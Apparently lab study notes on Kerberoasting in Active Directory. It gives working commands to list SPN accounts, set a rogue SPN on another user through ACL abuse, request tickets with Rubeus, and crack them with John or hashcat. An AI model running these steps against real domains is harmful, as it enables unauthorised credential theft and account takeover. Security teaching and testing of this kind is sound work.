# Kerberoasting

When a user account has a Service Principal Name, it is possible to request a Service Ticket for the service mentionned in the SPN.

The Service Ticket is encrypted with the password of the user account: it is possible to crack the ST to retrieve the user account's password.



## List users that have SPN

<pre class="language-powershell"><code class="lang-powershell"><strong>> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
</strong></code></pre>

## List users that have SPN in trusted forest

<pre class="language-powershell"><code class="lang-powershell"><strong>> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server dc.trust.local
</strong></code></pre>

## Set SPN to user

If our user has `GenericWrite` or `GenericAll` to another user, it is then possible to write an SPN and perform a targeted kerberoast attack.

```powershell
# List our privileges on the group StudentUsers
[PowerView]> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
# Or use BloodHound to find this
```

Update SPN:

```powershell
> Set-ADUser -Identity <username> -ServicePrincipalNames @{Add='domain/SPN'} -Verbose
[PowerView]> Set-DomainObject -Identity <username> -Set @{serviceprincipalname='domain/SPN'} -Verbose
```

Check that SPN has been updated:

```powershell
> Get-ADUser -Identity <username> -Properties ServicePrincipalName | select ServicePrincipalName
```

## Request ST

This command requests a Service Ticket for user `username`. The `/rc4opsec` flag only requests tickets for user accounts that support RC4.&#x20;

```powershell
> Rubeus.exe kerberoast /user:<username> /simple /nowrap /rc4opsec /outfile:hashes.txt
```

## Crack with JtR or hashcat

```powershell
> john.exe --wordlist=<path_to_wordlist> hashes.txt
> hashcat -m 13100 hashes.txt <path_to_wordlist>
```
